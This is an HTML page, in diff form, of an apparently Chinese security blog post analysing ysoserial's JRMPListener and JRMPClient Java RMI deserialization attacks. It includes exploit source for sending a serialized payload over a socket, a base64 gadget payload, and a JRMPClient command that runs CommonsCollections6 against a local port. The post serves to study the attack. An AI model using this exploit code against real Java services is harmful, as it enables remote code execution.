@@ -1,0 +1,382 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+    <head prefix="og: https://ogp.me/ns#">
+  <meta charset="utf-8">
+  <meta name="referrer" content="no-referrer" />
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <meta name="color-scheme" content="light dark">
+  
+  <title>Ysoserial JRMPListener/Client Review - Boogiepop Doesn&#39;t Laugh</title>
+  
+    <link rel="shortcut icon" href="/favicon.png">
+  
+  
+    <link rel='manifest' href='/manifest.json'>
+  
+
+  
+  
+  
+  <meta property="og:title" content="Ysoserial JRMPListener/Client Review - Boogiepop Doesn&#39;t Laugh" />
+  
+  <meta property="og:type" content="article" />
+  
+  <meta property="og:url" content="http://example.com/2024/02/29/Ysoserial%20JRMPListener_Client%20Review/index.html" />
+  
+  <meta property="og:image" content="/favicon.png" />
+  
+  <meta property="og:article:published_time" content="2024-02-29T00:42:44.000Z" />
+  
+  <meta property="og:article:author" content="Boogipop" />
+  
+  
+
+  
+<link rel="stylesheet" href="/css/var.css">
+
+  
+<link rel="stylesheet" href="/css/main.css">
+
+  
+<link rel="stylesheet" href="/css/typography.css">
+
+  
+<link rel="stylesheet" href="/css/code-highlighting.css">
+
+  
+<link rel="stylesheet" href="/css/components.css">
+
+  
+<link rel="stylesheet" href="/css/nav.css">
+
+  
+<link rel="stylesheet" href="/css/paginator.css">
+
+  
+<link rel="stylesheet" href="/css/footer.css">
+
+  
+<link rel="stylesheet" href="/css/post-list.css">
+
+  
+<link rel="stylesheet" href="/css/giscus.css">
+
+  
+  
+<link rel="stylesheet" href="/css/rainbow-banner.css">
+
+  
+  
+  
+<link rel="stylesheet" href="/css/toc.css">
+
+  
+  
+    
+<link rel="stylesheet" href="/css/giscus.css">
+
+  
+  
+  
+  
+<link rel="stylesheet" href="/css/post.css">
+
+  
+  
+  
+  
+  
+
+  
+<meta name="generator" content="Hexo 6.3.0"></head>
+    <body
+        data-color-scheme="auto"
+        data-uppercase-categories="true"
+        
+        data-rainbow-banner="true"
+        data-rainbow-banner-shown="auto"
+        data-rainbow-banner-month="6"
+        data-rainbow-banner-colors="#e50000,#ff8d00,#ffee00,#008121,#004cff,#760188"
+        
+        data-config-root="/"
+        
+        data-toc="true"
+        data-toc-max-depth="2"
+        
+        
+    >
+        <nav id="theme-nav">
+    <div class="inner">
+        <a class="title" href="/">Blog</a>
+        <div class="nav-arrow"></div>
+        <div class="nav-items">
+            <a class="nav-item nav-item-home" href="/">Home</a>
+            
+            
+            <a class="nav-item" href="/archives">Archives</a>
+            
+            
+            
+            <a class="nav-item" href="/friends">Friends</a>
+            
+            
+            
+            <a class="nav-item" href="/about">About</a>
+            
+            
+            
+            <a class="nav-item" href="/categories">Categories</a>
+            
+            
+            
+            <a class="nav-item nav-item-github nav-item-icon" href="https://github.com/MrWillCom" target="_blank" aria-label="GitHub">&nbsp;</a>
+            
+            
+            
+            <a class="nav-item nav-item-codepen nav-item-icon" href="https://codepen.io/mrwillcom" target="_blank" aria-label="CodePen">&nbsp;</a>
+            
+            
+            
+            <a class="nav-item nav-item-patreon nav-item-icon" href="https://www.patreon.com/MrWillCom" target="_blank" aria-label="Patreon">&nbsp;</a>
+            
+            
+            
+            <a class="nav-item nav-item-mastodon nav-item-icon" href="https://noc.social/@MrWillCom" target="_blank" aria-label="Mastodon">&nbsp;</a>
+            
+            
+            
+            <a class="nav-item nav-item-discord nav-item-icon" href="https://discord.gg/UKuFDjcfY8" target="_blank" aria-label="Discord">&nbsp;</a>
+            
+            
+            
+            <a class="nav-item nav-item-search nav-item-icon" href="/search" target="_blank" aria-label="Search">&nbsp;</a>
+            
+            
+        </div>
+    </div>
+</nav>
+        
+<article class="post">
+    <div class="meta">
+        
+        <div class="categories text-uppercase">
+        
+            <a href="/categories/At-Dawn/">At Dawn</a>
+        
+        </div>
+        
+
+        
+        <div class="date" id="date">
+            <span>February</span>
+            <span>29,</span>
+            <span>2024</span>
+        </div>
+        
+
+        <h2 class="title">Ysoserial JRMPListener/Client Review</h2>
+    </div>
+
+    <div class="divider"></div>
+
+    <div class="content">
+        <p><img src="https://github.com/frohoff/ysoserial/raw/master/ysoserial.png#from=url&id=wHNpd&originHeight=251&originWidth=300&originalType=binary&ratio=1.25&rotation=0&showTitle=false&status=done&style=none&title="></p>
+<p><strong>文章在先知社区首发</strong></p>
+<p>之前对这玩意儿还是不太熟悉呢，RMI的流程是熟悉了，但是这个还是有点混淆，特此记录。<br>有关RMI的直接推荐看一下Su18师傅的<br><a target="_blank" rel="noopener" href="https://su18.org/post/rmi-attack/#%E4%B8%89-%E6%80%BB%E7%BB%93">https://su18.org/post/rmi-attack/#%E4%B8%89-%E6%80%BB%E7%BB%93</a><br>这个写的不错我觉得。思路和条理都比较清晰，但是光看还是不行的。比我写的好，理清一下思路。（我自己都不想看自己写的)<br>也就是说当RMI Client发起请求后，流程大概如下</p>
+<blockquote>
+<ol>
+<li>RMI 客户端在调用远程方法时会先创建 Stub ( sun.rmi.registry.RegistryImpl_Stub )。</li>
+<li>Stub 会将 Remote 对象传递给远程引用层 ( java.rmi.server.RemoteRef ) 并创建 java.rmi.server.RemoteCall( 远程调用 )对象。</li>
+<li>RemoteCall 序列化 RMI 服务名称、Remote 对象。</li>
+<li>RMI 客户端的远程引用层传输 RemoteCall 序列化后的请求信息通过 Socket 连接的方式传输到 RMI 服务端的远程引用层。</li>
+<li>RMI服务端的远程引用层( sun.rmi.server.UnicastServerRef )收到请求会请求传递给 Skeleton ( sun.rmi.registry.RegistryImpl_Skel#dispatch )。</li>
+<li>Skeleton 调用 RemoteCall 反序列化 RMI 客户端传过来的序列化。</li>
+<li>Skeleton 处理客户端请求：bind、list、lookup、rebind、unbind，如果是 lookup 则查找 RMI 服务名绑定的接口对象，序列化该对象并通过 RemoteCall 传输到客户端。</li>
+<li>RMI 客户端反序列化服务端结果，获取远程对象的引用。</li>
+<li>RMI 客户端调用远程方法，RMI服务端反射调用RMI服务实现类的对应方法并序列化执行结果返回给客户端。</li>
+<li>RMI 客户端反序列化 RMI 远程方法调用结果。</li>
+</ol>
+</blockquote>
+<p>上述是su18写的原话，我感觉是精华。结构感很强，我看的很懂，因为之前也自己分析过一遍流程，所以看的比较明白。</p>
+<h1 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h1><h2 id="JRMPListenr"><a href="#JRMPListenr" class="headerlink" title="JRMPListenr"></a>JRMPListenr</h2><p>顾名思义就是起一个恶意的JRMP 监听器，用于接收一个JRMP请求，然后将恶意的序列化数据返回给我们的客户端，在客户端完成反序列化流程，最终RCE。这里演示一遍简单的流程，首先需要准备一下yso源码，然后写一个简单的demo请求这个Evil Listener</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.javasec;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Demo</span> &#123;</span><br><span class="line">    <span class="meta">@Test</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">test</span><span class="params">()</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        Naming.lookup(<span class="string">&quot;rmi://127.0.0.1:7777/xxxx&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>yso这边设置启动项<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1703162945575-42e35009-5025-417e-a34b-7ad7e3be2538.png#averageHue=%232c2f33&clientId=ud9a21f8b-e36e-4&from=paste&height=689&id=u8afccc8e&originHeight=861&originWidth=1306&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=108115&status=done&style=none&taskId=ufdc6401b-e58f-4eab-a798-fbc894a2eda&title=&width=1044.8" alt="image.png"><br>运行之后就会发现弹出了客户端弹出了计算器。<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1703162972327-654b193a-b4a0-44d6-970a-d7aae908d01a.png#averageHue=%2324464c&clientId=ud9a21f8b-e36e-4&from=paste&height=630&id=uefe59062&originHeight=788&originWidth=1274&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=45090&status=done&style=none&taskId=u1b4cb1d7-d9ba-4d0a-b0f7-08371d2a06b&title=&width=1019.2" alt="image.png"></p>
+<h3 id="流程分析"><a href="#流程分析" class="headerlink" title="流程分析"></a>流程分析</h3><p>这边进行双向流程分析，受害机和服务端的流程分析。<br>首先当客户端进行lookup后，服务端的thread会接收请求<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1703163155065-452882ad-9dc0-40d2-bd1d-d7905af83c07.png#averageHue=%232d313a&clientId=ud9a21f8b-e36e-4&from=paste&height=687&id=u70d8370c&originHeight=859&originWidth=1804&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=210670&status=done&style=none&taskId=uc11bdfaa-86e9-4b4e-83a5-685f7ee1da2&title=&width=1443.2" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1703163166235-e434aa37-9554-4b64-b9d4-61da4e9ce157.png#averageHue=%23484b5d&clientId=ud9a21f8b-e36e-4&from=paste&height=96&id=ufbcaf8b6&originHeight=120&originWidth=1407&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=26837&status=done&style=none&taskId=u0ace0728-c32f-4422-ab95-eadd5c456eb&title=&width=1125.6" alt="image.png"><br>进入到doMessage流程，然后会在client这边获取到op<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1703163200117-68d29851-ca02-4f9d-bf8d-d7e84aba1d5d.png#averageHue=%23282d36&clientId=ud9a21f8b-e36e-4&from=paste&height=210&id=uea090f7e&originHeight=263&originWidth=1136&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=45019&status=done&style=none&taskId=uebe32408-5d8d-46b7-b5ae-2693aa65384&title=&width=908.8" alt="image.png"><br>获取之后返回给服务端<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1703163209607-650a761c-3c6c-4209-8ee2-81399a093004.png#averageHue=%2331343e&clientId=ud9a21f8b-e36e-4&from=paste&height=367&id=u09b8126c&originHeight=459&originWidth=1864&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=105553&status=done&style=none&taskId=ue3dc2ca8-cc1a-43bf-9e47-ea4211a730d&title=&width=1491.2" alt="image.png"><br>这里op是80，对应<code>TransportConstants.Call</code>进入docall方法。<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1703163244529-2331d6a0-d8fd-4f1b-baad-5bdc56461821.png#averageHue=%232d3139&clientId=ud9a21f8b-e36e-4&from=paste&height=686&id=u891f8d5e&originHeight=858&originWidth=1767&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=197848&status=done&style=none&taskId=ufb3d1f27-6869-4eb0-b7e0-4156107ebbb&title=&width=1413.6" alt="image.png"><br>在这里开始设置恶意的返回值。<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1703163263197-4636ec88-2a8e-457c-9d1b-cd93aef71abb.png#averageHue=%23363a47&clientId=ud9a21f8b-e36e-4&from=paste&height=214&id=ufeb81a0a&originHeight=267&originWidth=1540&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=73677&status=done&style=none&taskId=u6db9358b-0025-4c69-b3aa-39d474fb196&title=&width=1232" alt="image.png"><br>注意这里设置了<code>TransportConstants.ExceptionalReturn</code>，这与我们后续client处理请求有关系，然后设置了一下payloadObject，这里是CC5。<br>随之进入Client<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1703163329719-0c5339da-a668-48ac-82c7-2d1a5332fc60.png#averageHue=%232d3139&clientId=ud9a21f8b-e36e-4&from=paste&height=647&id=u0a6340ad&originHeight=809&originWidth=1488&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=108929&status=done&style=none&taskId=u68c59a20-f4e5-40f7-8e55-0f53fcaf25e&title=&width=1190.4" alt="image.png"><br>这里的return type就是上面服务端设置的<code>TransportConstants.ExceptionalReturn</code>,因此我们会进入相应的case<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1703163355228-d7033c85-1f9f-4b63-9bba-d45fd2247b2d.png#averageHue=%232e3139&clientId=ud9a21f8b-e36e-4&from=paste&height=568&id=u6ab43221&originHeight=710&originWidth=1531&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=93823&status=done&style=none&taskId=uf528c45c-57c7-4f90-801c-c0db612edce&title=&width=1224.8" alt="image.png"><br>这里就对输入流进行了原生的反序列化。到这里也就完成了RCE，还是很有趣的。</p>
+<h2 id="JRMPClient"><a href="#JRMPClient" class="headerlink" title="JRMPClient"></a>JRMPClient</h2><p>参考下列的Payloads&#x2F;JRMPListener部分，他是用来主动攻击我们开启的JRMP服务端的。<br>Yso中对应的源码是</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">makeDGCCall</span> <span class="params">( String hostname, <span class="type">int</span> port, Object payloadObject )</span> <span class="keyword">throws</span> IOException, UnknownHostException, SocketException &#123;</span><br><span class="line">       <span class="type">InetSocketAddress</span> <span class="variable">isa</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InetSocketAddress</span>(hostname, port);</span><br><span class="line">       <span class="type">Socket</span> <span class="variable">s</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">       <span class="type">DataOutputStream</span> <span class="variable">dos</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">       <span class="keyword">try</span> &#123;</span><br><span class="line">           s = SocketFactory.getDefault().createSocket(hostname, port);</span><br><span class="line">           s.setKeepAlive(<span class="literal">true</span>);</span><br><span class="line">           s.setTcpNoDelay(<span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line">           <span class="type">OutputStream</span> <span class="variable">os</span> <span class="operator">=</span> s.getOutputStream();</span><br><span class="line">           dos = <span class="keyword">new</span> <span class="title class_">DataOutputStream</span>(os);</span><br><span class="line"></span><br><span class="line">           dos.writeInt(TransportConstants.Magic);</span><br><span class="line">           dos.writeShort(TransportConstants.Version);</span><br><span class="line">           dos.writeByte(TransportConstants.SingleOpProtocol);</span><br><span class="line"></span><br><span class="line">           dos.write(TransportConstants.Call);</span><br><span class="line"></span><br><span class="line">           <span class="meta">@SuppressWarnings</span> ( <span class="string">&quot;resource&quot;</span> )</span><br><span class="line">           <span class="keyword">final</span> <span class="type">ObjectOutputStream</span> <span class="variable">objOut</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">MarshalOutputStream</span>(dos);</span><br><span class="line"></span><br><span class="line">           objOut.writeLong(<span class="number">2</span>); <span class="comment">// DGC ObjID</span></span><br><span class="line">           objOut.writeInt(<span class="number">0</span>);</span><br><span class="line">           objOut.writeLong(<span class="number">0</span>);</span><br><span class="line">           objOut.writeShort(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">           objOut.writeInt(<span class="number">1</span>); <span class="comment">// dirty opnum is 1</span></span><br><span class="line">           objOut.writeLong(-<span class="number">669196253586618813L</span>); <span class="comment">// hash</span></span><br><span class="line"></span><br><span class="line">           objOut.writeObject(payloadObject); <span class="comment">//will be unmarshaled as the first parameter</span></span><br><span class="line"></span><br><span class="line">           os.flush();</span><br><span class="line">       &#125;</span><br><span class="line">       <span class="keyword">finally</span> &#123;</span><br><span class="line">           <span class="keyword">if</span> ( dos != <span class="literal">null</span> ) &#123;</span><br><span class="line">               dos.close();</span><br><span class="line">           &#125;</span><br><span class="line">           <span class="keyword">if</span> ( s != <span class="literal">null</span> ) &#123;</span><br><span class="line">               s.close();</span><br><span class="line">           &#125;</span><br><span class="line">       &#125;</span><br><span class="line">   &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1703177158092-5dce2c54-bca2-4944-9a58-595410a99ea5.png#averageHue=%23292e38&clientId=ud9a21f8b-e36e-4&from=paste&height=620&id=ud8272d61&originHeight=620&originWidth=817&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=83230&status=done&style=none&taskId=u78589cbb-8523-49d9-814d-e294ade258c&title=&width=817" alt="image.png"><br>这里对应<code>objOut.writeLong(-669196253586618813L);</code><br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1703177216715-561dceaa-b470-45a2-9c93-72d9b9888570.png#averageHue=%23282d37&clientId=ud9a21f8b-e36e-4&from=paste&height=549&id=u73c07c2a&originHeight=549&originWidth=1080&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=62199&status=done&style=none&taskId=uaea07c99-1f2f-4e6c-81d7-2ffe507b830&title=&width=1080" alt="image.png"><br>对应<code>objOut.writeInt(1); // dirty opnum is 1</code><br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1703177271426-ca8c1120-f802-4f6f-b6d9-f9d9324b125f.png#averageHue=%23292e37&clientId=ud9a21f8b-e36e-4&from=paste&height=432&id=ubf0dff37&originHeight=432&originWidth=1058&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=63204&status=done&style=none&taskId=u911a94dc-a343-4bf7-a2fe-710db764f92&title=&width=1058" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1703177279218-4422ac5d-ecd1-4f0f-a752-178eb1eb84ec.png#averageHue=%23282d35&clientId=ud9a21f8b-e36e-4&from=paste&height=379&id=ue446d667&originHeight=379&originWidth=945&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=52905&status=done&style=none&taskId=u04f49c2f-e1d2-4702-80a1-394a52733c9&title=&width=945" alt="image.png"><br>也就导致了反序列化，其他的write往前追溯都可以找到。<br>这里就对应上述payload中的write一系列。</p>
+<h1 id="Payloads"><a href="#Payloads" class="headerlink" title="Payloads"></a>Payloads</h1><p>payload模块对应的其实都是gadgets，rmi也有所谓的gadgets</p>
+<h2 id="JRMPListenr-1"><a href="#JRMPListenr-1" class="headerlink" title="JRMPListenr"></a>JRMPListenr</h2><p>首先payload&#x2F;JRMPListenr的作用体现在，会让存在反序列化入口点的地方，主动开启一个恶意的端口，然后当我们往这个开启的端口送入恶意的参数时就会触发反序列化，从而导致RCE。这个payload用到的地方不太多。但是流程很有趣。</p>
+<h3 id="流程分析-1"><a href="#流程分析-1" class="headerlink" title="流程分析"></a>流程分析</h3><p>其实我自己是比较习惯于正向分析一波先，但是这里为了让条理清晰一点，我选择逆向分析payload。<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1703174183925-e8bfabe2-3b7d-409d-bf35-64bc0ba0e4b9.png#averageHue=%23626670&clientId=ud9a21f8b-e36e-4&from=paste&height=293&id=u8805afd0&originHeight=293&originWidth=1155&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=552331&status=done&style=none&taskId=u05e0bbf8-2e46-42cc-a140-ac0b1c60eae&title=&width=1155" alt="image.png"><br><code>java -jar ysoserial-all.jar JRMPListener 8888|base64</code>，使用这个payload<br>准备一个demo</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.javasec;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.management.BadAttributeValueExpException;</span><br><span class="line"><span class="keyword">import</span> javax.xml.transform.Templates;</span><br><span class="line"><span class="keyword">import</span> java.nio.charset.StandardCharsets;</span><br><span class="line"><span class="keyword">import</span> java.rmi.Naming;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.HashSet;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Demo</span> &#123;</span><br><span class="line">    <span class="meta">@Test</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">test</span><span class="params">()</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="comment">//Naming.lookup(&quot;rmi://127.0.0.1:7777/xxxx&quot;);</span></span><br><span class="line">        SerializeUtils.base64deserial(<span class="string">&quot;rO0ABXNyACJzdW4ucm1pLnNlcnZlci5BY3RpdmF0aW9uR3JvdXBJbXBsT+r9SAwuMqcCAARaAA1ncm91cEluYWN0aXZlTAAGYWN0aXZldAAVTGphdmEvdXRpbC9IYXNodGFibGU7TAAHZ3JvdXBJRHQAJ0xqYXZhL3JtaS9hY3RpdmF0aW9uL0FjdGl2YXRpb25Hcm91cElEO0wACWxvY2tlZElEc3QAEExqYXZhL3V0aWwvTGlzdDt4cgAjamF2YS5ybWkuYWN0aXZhdGlvbi5BY3RpdmF0aW9uR3JvdXCVLvKwBSnVVAIAA0oAC2luY2FybmF0aW9uTAAHZ3JvdXBJRHEAfgACTAAHbW9uaXRvcnQAJ0xqYXZhL3JtaS9hY3RpdmF0aW9uL0FjdGl2YXRpb25Nb25pdG9yO3hyACNqYXZhLnJtaS5zZXJ2ZXIuVW5pY2FzdFJlbW90ZU9iamVjdEUJEhX14n4xAgADSQAEcG9ydEwAA2NzZnQAKExqYXZhL3JtaS9zZXJ2ZXIvUk1JQ2xpZW50U29ja2V0RmFjdG9yeTtMAANzc2Z0AChMamF2YS9ybWkvc2VydmVyL1JNSVNlcnZlclNvY2tldEZhY3Rvcnk7eHIAHGphdmEucm1pLnNlcnZlci5SZW1vdGVTZXJ2ZXLHGQcSaPM5+wIAAHhyABxqYXZhLnJtaS5zZXJ2ZXIuUmVtb3RlT2JqZWN002G0kQxhMx4DAAB4cHcSABBVbmljYXN0U2VydmVyUmVmeAAAIrhwcAAAAAAAAAAAcHAAcHBw&quot;</span>);</span><br><span class="line">        <span class="keyword">while</span> (<span class="literal">true</span>) &#123;</span><br><span class="line">            System.out.println(System.currentTimeMillis());</span><br><span class="line">            Thread.sleep(<span class="number">3000</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>这里的while循环是为了让进程不结束，因为我们要开端口的，程序结束了那么啥都结束了。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">/**</span><br><span class="line"> *</span><br><span class="line"> *</span><br><span class="line"> * UnicastRef.newCall(RemoteObject, Operation[], int, long)</span><br><span class="line"> * DGCImpl_Stub.dirty(ObjID[], long, Lease)</span><br><span class="line"> * DGCClient$EndpointEntry.makeDirtyCall(Set&lt;RefEntry&gt;, long)</span><br><span class="line"> * DGCClient$EndpointEntry.registerRefs(List&lt;LiveRef&gt;)</span><br><span class="line"> * DGCClient.registerRefs(Endpoint, List&lt;LiveRef&gt;)</span><br><span class="line"> * LiveRef.read(ObjectInput, boolean)</span><br><span class="line"> * UnicastRef.readExternal(ObjectInput)</span><br><span class="line"> *</span><br><span class="line"> * Thread.start()</span><br><span class="line"> * DGCClient$EndpointEntry.&lt;init&gt;(Endpoint)</span><br><span class="line"> * DGCClient$EndpointEntry.lookup(Endpoint)</span><br><span class="line"> * DGCClient.registerRefs(Endpoint, List&lt;LiveRef&gt;)</span><br><span class="line"> * LiveRef.read(ObjectInput, boolean)</span><br><span class="line"> * UnicastRef.readExternal(ObjectInput)</span><br><span class="line"> *</span><br></pre></td></tr></table></figure>
+<p>Yso给出了调用栈，我们跟着来一下<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1703176465497-aa4c097e-448b-4fda-b9b4-c1352cc9a339.png#averageHue=%2343535c&clientId=ud9a21f8b-e36e-4&from=paste&height=567&id=u7084669e&originHeight=567&originWidth=1947&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=156290&status=done&style=none&taskId=u5c5e296e-3e25-4d4e-b9e6-a7f5bce5afd&title=&width=1947" alt="image.png"><br>reexport函数<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1703176492181-e31abf94-d341-4ee6-8891-36981ad0a2b7.png#averageHue=%232a2e34&clientId=ud9a21f8b-e36e-4&from=paste&height=1294&id=u265c11dc&originHeight=1294&originWidth=1903&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=330118&status=done&style=none&taskId=uc93dc796-d5d2-4bfc-9090-7079ca7960d&title=&width=1903" alt="image.png"><br>这里就是我们payload里的ActiveGroupImpl了。我们准备把他export。<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1703176520561-a77e160c-c81e-4c8e-a2c0-b17d05e32808.png#averageHue=%232d313a&clientId=ud9a21f8b-e36e-4&from=paste&height=832&id=u4491e31b&originHeight=832&originWidth=1465&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=125630&status=done&style=none&taskId=udf304574-0b19-4ee6-a968-99bc0b533a3&title=&width=1465" alt="image.png"><br>用UnicastServerRef包裹了一下<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1703176544759-a56d4515-7dd6-4a0d-a164-0a79ffef6b33.png#averageHue=%232a2e34&clientId=ud9a21f8b-e36e-4&from=paste&height=715&id=u8bacf9f3&originHeight=715&originWidth=1649&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=90423&status=done&style=none&taskId=udea338a5-1d4c-43d0-842b-e309e4d6912&title=&width=1649" alt="image.png"><br>这里就是一直export，我直接跳过了<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1703176737388-e33663ab-190f-4e00-b4dc-23db04d56196.png#averageHue=%23303540&clientId=ud9a21f8b-e36e-4&from=paste&height=420&id=u844da388&originHeight=420&originWidth=1553&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=55654&status=done&style=none&taskId=ud77a25eb-e3ff-40a5-8cde-7a8fcd26c84&title=&width=1553" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1703176856833-da51e2e3-647e-4819-987a-5888e83f1bde.png#averageHue=%23282d36&clientId=ud9a21f8b-e36e-4&from=paste&height=207&id=u81c87da6&originHeight=207&originWidth=975&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=34358&status=done&style=none&taskId=u4106b137-2854-40dc-aaa6-b22f54bc305&title=&width=975" alt="image.png"><br>到这里就listen开启监听了。然后我们就可以用<code>exploit/jrmpclient</code>去攻击这个地方了。<br><code>java -cp ysoserial-all.jar ysoserial.exploit.JRMPClient 127.0.0.1 8888 CommonsCollections6 calc</code></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">readObject:297, HashSet (java.util)</span><br><span class="line">invoke0:-1, NativeMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:62, NativeMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:43, DelegatingMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:497, Method (java.lang.reflect)</span><br><span class="line">invokeReadObject:1058, ObjectStreamClass (java.io)</span><br><span class="line">readSerialData:1900, ObjectInputStream (java.io)</span><br><span class="line">readOrdinaryObject:1801, ObjectInputStream (java.io)</span><br><span class="line">readObject0:1351, ObjectInputStream (java.io)</span><br><span class="line">readObject:371, ObjectInputStream (java.io)</span><br><span 